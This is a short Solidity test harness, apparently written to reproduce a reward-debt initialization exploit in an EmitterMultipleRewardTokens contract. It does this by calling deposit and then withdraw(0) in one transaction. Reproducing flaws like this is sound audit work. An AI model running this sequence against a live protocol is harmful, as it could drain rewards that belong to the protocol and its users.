// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.9;

import { IEmitterMultipleRewardTokens } from "../interfaces/IEmitterMultipleRewardTokens.sol";

/**
 * @title AttackerHarness
 * @notice Minimal harness that executes deposit followed by withdraw(0) in a single transaction
 *         to reproduce the reward-debt initialization exploit scenario for EmitterMultipleRewardTokens.
 *         The caller must ensure this contract has an active Dolomite account with sufficient balance
 *         for the provided market and `fromAccountNumber`.
 */
contract AttackerHarness {
    event AttackExecuted(address indexed emitter, uint256 marketId, uint256 amountWei);

    function attackDepositWithdrawZero(
        address emitter,
        uint256 fromAccountNumber,
        uint256 marketId,
        uint256 amountWei
    ) external {
        IEmitterMultipleRewardTokens(emitter).deposit(fromAccountNumber, marketId, amountWei);
        IEmitterMultipleRewardTokens(emitter).withdraw(marketId, 0);
        emit AttackExecuted(emitter, marketId, amountWei);
    }
}

